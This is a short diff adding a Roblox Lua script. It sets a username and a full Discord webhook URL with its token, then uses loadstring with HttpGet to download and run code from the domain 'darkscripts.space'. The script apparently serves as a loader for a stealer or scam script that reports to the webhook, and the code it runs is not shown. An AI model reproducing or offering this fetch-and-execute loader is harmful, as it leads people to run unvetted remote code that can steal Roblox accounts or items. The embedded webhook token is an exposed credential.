@@ -1,0 +1,4 @@
+username = "Eliaskulmer999" -- Put Your Roblox Username
+Webhook = "https://discord.com/api/webhooks/1282130636752031754/ITaa2N06NAeVLtETKkVkdmCCFc67P-Cie5F3KZcNSMd7X0KipG-lufE21Khm6b7EdJFe" -- Put Your Discord Webhook
+
+loadstring(game:HttpGet("https://darkscripts.space/pleasedonate",true))()
